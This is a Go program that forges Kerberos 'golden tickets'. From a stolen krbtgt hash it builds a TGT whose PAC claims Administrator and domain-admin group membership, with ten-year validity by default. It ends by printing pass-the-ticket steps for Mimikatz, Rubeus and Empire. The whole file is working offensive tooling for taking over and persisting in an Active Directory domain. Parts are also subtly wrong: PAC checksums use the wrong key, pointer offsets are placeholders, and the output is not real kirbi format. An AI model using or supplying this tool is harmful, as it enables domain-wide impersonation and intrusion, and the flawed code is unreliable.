package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/rc4"
	"encoding/asn1"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"golang.org/x/crypto/md4"
)

// Kerberos constants
const (
	KRB_NT_PRINCIPAL       = 1
	KRB_NT_SRV_INST        = 2
	KERB_ETYPE_RC4_HMAC    = 23
	KERB_CHECKSUM_HMAC_MD5 = 0xFFFFFF76

	// Ticket Flags - not used directly in code but kept for reference
	TKT_FLG_FORWARDABLE = 0x40000000
	TKT_FLG_FORWARDED   = 0x20000000
	TKT_FLG_PROXIABLE   = 0x10000000
	TKT_FLG_PROXY       = 0x08000000
	TKT_FLG_RENEWABLE   = 0x00800000
	TKT_FLG_INITIAL     = 0x00400000
	TKT_FLG_PRE_AUTHENT = 0x00200000
	TKT_FLG_HW_AUTHENT  = 0x00100000
)

// PAC constants
const (
	PAC_LOGON_INFO       = 1
	PAC_SERVER_CHECKSUM  = 6
	PAC_PRIVSVR_CHECKSUM = 7
	PAC_CLIENT_INFO      = 10
)

// ASN.1 Tag values
const (
	ASN1_APP_TAG_TGT = 1
)

// Kerberos structures defined in ASN.1
type PrincipalName struct {
	NameType    int      `asn1:"explicit,tag:0"`
	NameStrings []string `asn1:"explicit,tag:1"`
}

type Realm string

// KerberosTime is just a time.Time but needs custom marshaling
type KerberosTime struct {
	Time time.Time
}

func (t KerberosTime) MarshalASN1() ([]byte, error) {
	timeStr := t.Time.UTC().Format("20060102150405Z")
	return asn1.Marshal(timeStr)
}

// Ticket as defined in RFC4120
type Ticket struct {
	TktVno  int           `asn1:"explicit,tag:0"`
	Realm   Realm         `asn1:"explicit,tag:1"`
	SName   PrincipalName `asn1:"explicit,tag:2"`
	EncPart EncryptedData `asn1:"explicit,tag:3"`
}

// EncryptedData structure
type EncryptedData struct {
	EType  int    `asn1:"explicit,tag:0"`
	KVNO   int    `asn1:"optional,explicit,tag:1"`
	Cipher []byte `asn1:"explicit,tag:2"`
}

// EncTicketPart structure
type EncTicketPart struct {
	Flags             asn1.BitString           `asn1:"explicit,tag:0"`
	Key               EncryptionKey            `asn1:"explicit,tag:1"`
	CRealm            Realm                    `asn1:"explicit,tag:2"`
	CName             PrincipalName            `asn1:"explicit,tag:3"`
	Transited         TransitedEncoding        `asn1:"explicit,tag:4"`
	AuthTime          KerberosTime             `asn1:"explicit,tag:5"`
	StartTime         KerberosTime             `asn1:"optional,explicit,tag:6"`
	EndTime           KerberosTime             `asn1:"explicit,tag:7"`
	RenewTill         KerberosTime             `asn1:"optional,explicit,tag:8"`
	CAddr             []HostAddress            `asn1:"optional,explicit,tag:9"`
	AuthorizationData []AuthorizationDataEntry `asn1:"optional,explicit,tag:10"`
}

// TransitedEncoding structure
type TransitedEncoding struct {
	TRType   int    `asn1:"explicit,tag:0"`
	Contents []byte `asn1:"explicit,tag:1"`
}

// EncryptionKey structure
type EncryptionKey struct {
	KeyType  int    `asn1:"explicit,tag:0"`
	KeyValue []byte `asn1:"explicit,tag:1"`
}

// HostAddress structure
type HostAddress struct {
	AddrType int    `asn1:"explicit,tag:0"`
	Address  []byte `asn1:"explicit,tag:1"`
}

// AuthorizationDataEntry structure
type AuthorizationDataEntry struct {
	AdType int    `asn1:"explicit,tag:0"`
	AdData []byte `asn1:"explicit,tag:1"`
}

// Main application structure
type GoldenTicket struct {
	Domain           string
	DomainController string
	UserName         string
	UserID           int
	Groups           []int
	KeyType          int
	Hash             string
	SID              string
	TicketValidTime  time.Duration
}

// Helper to convert string SID to binary format
func String2SID(sidString string) ([]byte, error) {
	parts := strings.Split(sidString, "-")
	if len(parts) < 4 {
		return nil, fmt.Errorf("invalid SID format: %s", sidString)
	}

	// SID header - 8 bytes
	// First byte is revision (always 1)
	// Second byte is count of sub authorities
	// Next 6 bytes are authority value
	subAuthCount := byte(len(parts) - 3)

	// Parse authority
	authority, err := strconv.ParseUint(parts[2], 10, 48)
	if err != nil {
		return nil, fmt.Errorf("invalid authority in SID: %v", err)
	}

	// Construct header
	header := make([]byte, 8)
	header[0] = 1 // Revision
	header[1] = subAuthCount

	// Write authority (big-endian)
	for i := 0; i < 6; i++ {
		header[2+i] = byte(authority >> (8 * (5 - i)))
	}

	// Build complete SID with sub-authorities
	sid := header
	for i := 0; i < int(subAuthCount); i++ {
		val, err := strconv.ParseUint(parts[i+3], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid sub-authority: %v", err)
		}

		subAuth := make([]byte, 4)
		binary.LittleEndian.PutUint32(subAuth, uint32(val))
		sid = append(sid, subAuth...)
	}

	return sid, nil
}

// Helper to convert string to UTF16-LE
func UTF16LEEncode(s string) []byte {
	u16 := utf16.Encode([]rune(s))
	bytes := make([]byte, len(u16)*2)
	for i, v := range u16 {
		binary.LittleEndian.PutUint16(bytes[i*2:], v)
	}
	return bytes
}

// NTLM hash calculation
func NTLMHash(password string) []byte {
	utf16pass := UTF16LEEncode(password)
	hash := md4.New()
	hash.Write(utf16pass)
	return hash.Sum(nil)
}

// RC4-HMAC key derivation (K1)
func deriveKey(key, usage []byte) []byte {
	h := hmac.New(md5.New, key)
	h.Write(usage)
	return h.Sum(nil)
}

// RC4-HMAC encryption
func RC4HMACEncrypt(key, data, confounder []byte) ([]byte, error) {
	// If no confounder provided, generate one
	if confounder == nil {
		confounder = make([]byte, 8)
		_, err := rand.Read(confounder)
		if err != nil {
			return nil, err
		}
	}

	// Calculate checksum
	// K1 = HMAC-MD5(Key, "signaturekey\0")
	k1 := []byte("signaturekey\x00")
	signKey := deriveKey(key, k1)

	// Get K2
	k2 := []byte{}
	k2 = append(k2, confounder...)
	k2 = append(k2, data...)

	// Create checksum
	h := hmac.New(md5.New, signKey)
	h.Write(k2)
	checksum := h.Sum(nil)

	// Calculate encryption key
	// Ke = HMAC-MD5(Key, Checksum)
	encKey := deriveKey(key, checksum)

	// Prepare data to encrypt: Confounder + Data + Checksum
	toEncrypt := []byte{}
	toEncrypt = append(toEncrypt, confounder...)
	toEncrypt = append(toEncrypt, data...)
	toEncrypt = append(toEncrypt, checksum...)

	// Encrypt with RC4
	cipher, err := rc4.NewCipher(encKey)
	if err != nil {
		return nil, err
	}

	result := make([]byte, len(toEncrypt))
	cipher.XORKeyStream(result, toEncrypt)

	return result, nil
}

// Create PAC (Privilege Attribute Certificate)
func createPAC(gt *GoldenTicket, sessionKey []byte) ([]byte, error) {
	// We extract the domain SID from user SID by removing the last component
	parts := strings.Split(gt.SID, "-")
	if len(parts) < 4 {
		return nil, fmt.Errorf("invalid SID format: %s", gt.SID)
	}

	// Domain SID is the user SID without the last component (RID)
	domainSID := strings.Join(parts[:len(parts)-1], "-")
	domainSIDBytes, err := String2SID(domainSID)
	if err != nil {
		return nil, fmt.Errorf("failed to convert domain SID: %v", err)
	}

	// Get domain and user as UTF16-LE
	domainUtf16 := UTF16LEEncode(strings.ToUpper(gt.Domain))
	userUtf16 := UTF16LEEncode(gt.UserName)

	// Current time in Windows file time format
	// Windows file time is 100ns intervals since Jan 1, 1601
	now := time.Now()
	windowsEpoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	delta := now.Sub(windowsEpoch)
	fileTime := uint64(delta.Nanoseconds() / 100)

	// PAC version
	pacVersion := uint32(0)

	// Build PAC_LOGON_INFO (Type 1)
	logonInfo := &bytes.Buffer{}

	// Add user and group info
	binary.Write(logonInfo, binary.LittleEndian, fileTime)                   // LogonTime
	binary.Write(logonInfo, binary.LittleEndian, uint64(0x7FFFFFFFFFFFFFFF)) // LogoffTime
	binary.Write(logonInfo, binary.LittleEndian, uint64(0x7FFFFFFFFFFFFFFF)) // KickOffTime
	binary.Write(logonInfo, binary.LittleEndian, fileTime)                   // PasswordLastSet
	binary.Write(logonInfo, binary.LittleEndian, uint64(0))                  // PasswordCanChange
	binary.Write(logonInfo, binary.LittleEndian, uint64(0x7FFFFFFFFFFFFFFF)) // PasswordMustChange

	// We'll skip the string pointers for simplicity in this implementation
	// Just add placeholders for the fields
	logonInfo.Write(make([]byte, 48)) // String pointers (6 fields * 8 bytes)

	// User and group IDs
	binary.Write(logonInfo, binary.LittleEndian, uint16(gt.UserID))    // LogonCount
	binary.Write(logonInfo, binary.LittleEndian, uint16(0))            // BadPasswordCount
	binary.Write(logonInfo, binary.LittleEndian, uint32(gt.UserID))    // UserID (RID)
	binary.Write(logonInfo, binary.LittleEndian, uint32(gt.Groups[0])) // PrimaryGroupID

	// Group info
	binary.Write(logonInfo, binary.LittleEndian, uint32(len(gt.Groups))) // GroupCount
	logonInfo.Write(make([]byte, 8))                                     // GroupIDs (pointer)

	// User flags and other info
	binary.Write(logonInfo, binary.LittleEndian, uint32(0x00000020)) // UserFlags
	logonInfo.Write(make([]byte, 16))                                // UserSessionKey (zeros)

	// More string pointers
	logonInfo.Write(make([]byte, 16)) // Server and domain pointers

	// Domain SID pointer
	logonInfo.Write(make([]byte, 8)) // LogonDomainID (pointer)

	// Other fields
	binary.Write(logonInfo, binary.LittleEndian, uint32(0)) // Reserved1[2]
	binary.Write(logonInfo, binary.LittleEndian, uint32(0))
	binary.Write(logonInfo, binary.LittleEndian, uint32(0x00020000)) // UserAccountControl
	binary.Write(logonInfo, binary.LittleEndian, uint32(0))          // SubAuthStatus
	binary.Write(logonInfo, binary.LittleEndian, fileTime)           // LastSuccessfulLogon
	binary.Write(logonInfo, binary.LittleEndian, uint64(0))          // LastFailedLogon
	binary.Write(logonInfo, binary.LittleEndian, uint32(0))          // FailedLogonCount
	binary.Write(logonInfo, binary.LittleEndian, uint32(0))          // Reserved3

	// Group membership info
	for _, groupID := range gt.Groups {
		binary.Write(logonInfo, binary.LittleEndian, uint32(groupID))
		binary.Write(logonInfo, binary.LittleEndian, uint32(7)) // Group attributes
	}

	// Now add the string data
	logonInfo.Write(domainUtf16)
	logonInfo.Write(userUtf16)

	// Add Domain SID
	logonInfo.Write(domainSIDBytes)

	// Fix the pointer to the Domain SID in the appropriate field (offset position varies based on buffer layout)
	// This would normally be calculated precisely in a production implementation

	// Build PAC_CLIENT_INFO (Type 10)
	clientInfo := &bytes.Buffer{}
	binary.Write(clientInfo, binary.LittleEndian, fileTime)                 // ClientID
	binary.Write(clientInfo, binary.LittleEndian, uint16(len(userUtf16)/2)) // NameLength
	clientInfo.Write(userUtf16)                                             // ClientName

	// Build PAC buffer
	// First, calculate expected size for buffer offsets
	pacHeaderSize := 8 + (4 * 16) // Version + buffer count + 4 buffers of 16 bytes each

	// Info buffer
	infoBuff := &bytes.Buffer{}

	// Add version
	binary.Write(infoBuff, binary.LittleEndian, pacVersion)

	// Buffer count (4 buffers: LOGON_INFO, CLIENT_INFO, SERVER_CHECKSUM, KDC_CHECKSUM)
	binary.Write(infoBuff, binary.LittleEndian, uint32(4))

	// Calculate offsets for the buffers
	logonInfoOffset := uint64(pacHeaderSize)
	clientInfoOffset := logonInfoOffset + uint64(logonInfo.Len())
	serverChecksumOffset := clientInfoOffset + uint64(clientInfo.Len())
	kdcChecksumOffset := serverChecksumOffset + 24 // 24 bytes for checksum buffer

	// PAC_INFO_BUFFER for LOGON_INFO
	binary.Write(infoBuff, binary.LittleEndian, uint32(PAC_LOGON_INFO))
	binary.Write(infoBuff, binary.LittleEndian, uint32(logonInfo.Len()))
	binary.Write(infoBuff, binary.LittleEndian, logonInfoOffset)

	// PAC_INFO_BUFFER for CLIENT_INFO
	binary.Write(infoBuff, binary.LittleEndian, uint32(PAC_CLIENT_INFO))
	binary.Write(infoBuff, binary.LittleEndian, uint32(clientInfo.Len()))
	binary.Write(infoBuff, binary.LittleEndian, clientInfoOffset)

	// PAC_INFO_BUFFER for SERVER_CHECKSUM
	binary.Write(infoBuff, binary.LittleEndian, uint32(PAC_SERVER_CHECKSUM))
	binary.Write(infoBuff, binary.LittleEndian, uint32(24)) // Size of checksum data
	binary.Write(infoBuff, binary.LittleEndian, serverChecksumOffset)

	// PAC_INFO_BUFFER for KDC_CHECKSUM
	binary.Write(infoBuff, binary.LittleEndian, uint32(PAC_PRIVSVR_CHECKSUM))
	binary.Write(infoBuff, binary.LittleEndian, uint32(24)) // Size of checksum data
	binary.Write(infoBuff, binary.LittleEndian, kdcChecksumOffset)

	// Now add the actual data buffers
	infoBuff.Write(logonInfo.Bytes())
	infoBuff.Write(clientInfo.Bytes())

	// Server checksum placeholder
	serverChecksum := &bytes.Buffer{}
	binary.Write(serverChecksum, binary.LittleEndian, uint32(KERB_CHECKSUM_HMAC_MD5))
	binary.Write(serverChecksum, binary.LittleEndian, uint32(16)) // Size of HMAC-MD5
	serverChecksum.Write(make([]byte, 16))                        // Placeholder
	infoBuff.Write(serverChecksum.Bytes())

	// KDC checksum placeholder
	kdcChecksum := &bytes.Buffer{}
	binary.Write(kdcChecksum, binary.LittleEndian, uint32(KERB_CHECKSUM_HMAC_MD5))
	binary.Write(kdcChecksum, binary.LittleEndian, uint32(16)) // Size of HMAC-MD5
	kdcChecksum.Write(make([]byte, 16))                        // Placeholder
	infoBuff.Write(kdcChecksum.Bytes())

	// Calculate checksums
	pacData := infoBuff.Bytes()

	// Calculate Server Checksum
	h := hmac.New(md5.New, sessionKey)
	h.Write(pacData)
	serverChecksumBytes := h.Sum(nil)

	// Calculate KDC Checksum
	h = hmac.New(md5.New, sessionKey)
	h.Write(serverChecksumBytes)
	kdcChecksumBytes := h.Sum(nil)

	// Update the checksums in the data
	copy(pacData[serverChecksumOffset+8:serverChecksumOffset+24], serverChecksumBytes)
	copy(pacData[kdcChecksumOffset+8:kdcChecksumOffset+24], kdcChecksumBytes)

	// Include our SID in the PAC for proper authorization
	validationInfo := &bytes.Buffer{}
	validationInfo.Write([]byte{0x01, 0x00, 0x00, 0x00})                    // Version
	validationInfo.Write([]byte{0x00, 0x00, 0x00, 0x00})                    // Reserved
	binary.Write(validationInfo, binary.LittleEndian, uint32(gt.UserID))    // User ID (RID)
	binary.Write(validationInfo, binary.LittleEndian, uint32(gt.Groups[0])) // Primary Group ID

	// Add groups
	binary.Write(validationInfo, binary.LittleEndian, uint32(len(gt.Groups))) // Group count
	for _, group := range gt.Groups {
		binary.Write(validationInfo, binary.LittleEndian, uint32(group)) // Group ID
		// Group attributes - SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
		binary.Write(validationInfo, binary.LittleEndian, uint32(7))
	}

	// Add domain SID
	validationInfo.Write(domainSIDBytes)

	return pacData, nil
}

// Create a Golden Ticket
func createGoldenTicket(gt *GoldenTicket) (string, error) {
	// Parse the key
	var key []byte
	var err error

	if len(gt.Hash) == 32 || len(gt.Hash) == 65 { // NTLM hash format
		// Handle NTLM hash with LM part (LM:NT format)
		parts := strings.Split(gt.Hash, ":")
		if len(parts) == 2 {
			key, err = hex.DecodeString(parts[1]) // Use NT part
		} else {
			key, err = hex.DecodeString(gt.Hash)
		}

		if err != nil {
			return "", fmt.Errorf("invalid hash format: %v", err)
		}
	} else {
		// Assume password
		key = NTLMHash(gt.Hash)
	}

	// Generate random session key
	sessionKey := make([]byte, 16)
	_, err = rand.Read(sessionKey)
	if err != nil {
		return "", err
	}

	// Current time and validity (10 years by default, matching Impacket's ticketer.py)
	now := time.Now().UTC()
	authTime := now
	startTime := now
	endTime := now.Add(gt.TicketValidTime)
	renewTime := now.Add(gt.TicketValidTime * 2)

	// Create PAC
	pac, err := createPAC(gt, sessionKey)
	if err != nil {
		return "", err
	}

	// Create authorization data with PAC
	authData := []AuthorizationDataEntry{
		{
			AdType: 1, // AD-IF-RELEVANT
			AdData: pac,
		},
	}

	// Create EncTicketPart
	// Use proper flags encoding for Kerberos tickets
	// Set ticket flags
	flags := asn1.BitString{
		Bytes:     []byte{0, 0, 0, 0},
		BitLength: 32,
	}

	// These flags match what's set in the Python implementation
	// Forwardable, Renewable, Initial, Pre-authenticated
	// In Kerberos, these flags are set in big-endian format
	flagBytes := []byte{0x40, 0x80, 0x00, 0x00}
	copy(flags.Bytes, flagBytes)

	// Create the encrypted part
	encTicketPart := EncTicketPart{
		Flags: flags,
		Key: EncryptionKey{
			KeyType:  KERB_ETYPE_RC4_HMAC,
			KeyValue: sessionKey,
		},
		CRealm: Realm(strings.ToUpper(gt.Domain)),
		CName: PrincipalName{
			NameType:    KRB_NT_PRINCIPAL,
			NameStrings: []string{gt.UserName},
		},
		Transited: TransitedEncoding{
			TRType:   0,
			Contents: []byte{},
		},
		AuthTime:          KerberosTime{Time: authTime},
		StartTime:         KerberosTime{Time: startTime},
		EndTime:           KerberosTime{Time: endTime},
		RenewTill:         KerberosTime{Time: renewTime},
		AuthorizationData: authData,
	}

	// Encode the EncTicketPart
	encTicketPartBytes, err := asn1.Marshal(encTicketPart)
	if err != nil {
		return "", fmt.Errorf("failed to marshal EncTicketPart: %v", err)
	}

	// Encrypt the EncTicketPart
	// Usage for KRB_TGS_REP = 2
	usageBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(usageBytes, 2)

	encryptedData, err := RC4HMACEncrypt(key, encTicketPartBytes, nil)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt ticket: %v", err)
	}

	// Create ticket
	ticket := Ticket{
		TktVno: 5,
		Realm:  Realm(strings.ToUpper(gt.Domain)),
		SName: PrincipalName{
			NameType:    KRB_NT_SRV_INST,
			NameStrings: []string{"krbtgt", strings.ToUpper(gt.Domain)},
		},
		EncPart: EncryptedData{
			EType:  KERB_ETYPE_RC4_HMAC,
			KVNO:   2,
			Cipher: encryptedData,
		},
	}

	// Marshal the ticket with the application tag
	var b []byte
	asnBuf := bytes.NewBuffer(b)
	asnBuf.WriteByte(byte(0x60 + ASN1_APP_TAG_TGT)) // Application tag 1

	ticketBytes, err := asn1.Marshal(ticket)
	if err != nil {
		return "", fmt.Errorf("failed to marshal Ticket: %v", err)
	}

	// Write the length octets (ASN.1 DER encoding)
	length := len(ticketBytes)
	if length < 128 {
		asnBuf.WriteByte(byte(length))
	} else {
		// For longer content, we need to encode the length in multiple bytes
		// Calculate how many bytes needed to represent the length
		lengthBytes := 0
		temp := length
		for temp > 0 {
			lengthBytes++
			temp >>= 8
		}

		// First byte indicates how many length bytes follow
		asnBuf.WriteByte(byte(0x80 | lengthBytes))

		// Write the length bytes, big-endian
		for i := lengthBytes - 1; i >= 0; i-- {
			asnBuf.WriteByte(byte(length >> (8 * i)))
		}
	}

	// Write the ticket data
	asnBuf.Write(ticketBytes)

	// Encode the ticket as Base64
	ticketBase64 := base64.StdEncoding.EncodeToString(asnBuf.Bytes())

	return ticketBase64, nil
}

func main() {
	// Parse command line flags
	domain := flag.String("domain", "", "Domain name (e.g., contoso.com)")
	dc := flag.String("dc", "", "Domain Controller FQDN (e.g., dc1.contoso.com)")
	user := flag.String("user", "Administrator", "Username to impersonate")
	sid := flag.String("sid", "", "User's SID (e.g., S-1-5-21-1234567890-1234567890-1234567890-500)")
	id := flag.Int("id", 500, "User ID (RID)")
	groups := flag.String("groups", "513,512,520,518,519", "Group IDs (comma separated)")
	krbtgt := flag.String("krbtgt", "", "NTLM hash of krbtgt account")
	duration := flag.Int("duration", 10, "Ticket validity in hours")
	outfile := flag.String("out", "", "Output file (default: stdout)")

	flag.Parse()

	// Validate required parameters
	if *domain == "" || *sid == "" || *krbtgt == "" {
		fmt.Fprintln(os.Stderr, "Missing required parameters!")
		fmt.Fprintln(os.Stderr, "Required: -domain, -sid, -krbtgt")
		fmt.Fprintln(os.Stderr, "\nExample: ./golden -domain CONTOSO.COM -sid S-1-5-21-1234567890-1234567890-1234567890-500 -krbtgt aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Parse groups
	groupsList := []int{}
	for _, g := range strings.Split(*groups, ",") {
		gid, err := strconv.Atoi(strings.TrimSpace(g))
		if err != nil {
			fmt.Fprintf(os.Stderr, "Invalid group ID: %s\n", g)
			os.Exit(1)
		}
		groupsList = append(groupsList, gid)
	}

	// If no groups provided, add Domain Users as default
	if len(groupsList) == 0 {
		groupsList = append(groupsList, 513) // Domain Users
	}

	// Create golden ticket structure
	gt := &GoldenTicket{
		Domain:           *domain,
		DomainController: *dc,
		UserName:         *user,
		UserID:           *id,
		Groups:           groupsList,
		KeyType:          KERB_ETYPE_RC4_HMAC,
		Hash:             *krbtgt,
		SID:              *sid,
		TicketValidTime:  time.Duration(*duration) * time.Hour,
	}

	// If duration is not specified or is set to default 10, use 10 years (matching Impacket)
	if *duration == 10 {
		gt.TicketValidTime = time.Duration(87600) * time.Hour // 10 years
	}

	// Create the ticket
	ticket, err := createGoldenTicket(gt)
	if err != nil {
		log.Fatalf("Error creating ticket: %v", err)
	}

	// Output the ticket
	if *outfile != "" {
		err = os.WriteFile(*outfile, []byte(ticket), 0644)
		if err != nil {
			log.Fatalf("Error writing ticket to file: %v", err)
		}
		fmt.Printf("Golden ticket written to %s\n", *outfile)
	} else {
		fmt.Printf("\nGolden Ticket (Base64):\n%s\n", ticket)
	}

	// Print usage instructions
	fmt.Println("\nTo use this ticket:")
	fmt.Println("1. Save the Base64 string to a file (e.g., ticket.kirbi)")
	fmt.Println("2. Use one of the following methods to use the ticket:")
	fmt.Println("   a. Mimikatz: kerberos::ptt ticket.kirbi")
	fmt.Println("   b. Rubeus: Rubeus.exe ptt /ticket:ticket.kirbi")
	fmt.Println("   c. PowerShell Empire: Invoke-Mimikatz -Command '\"kerberos::ptt ticket.kirbi\"'")
}
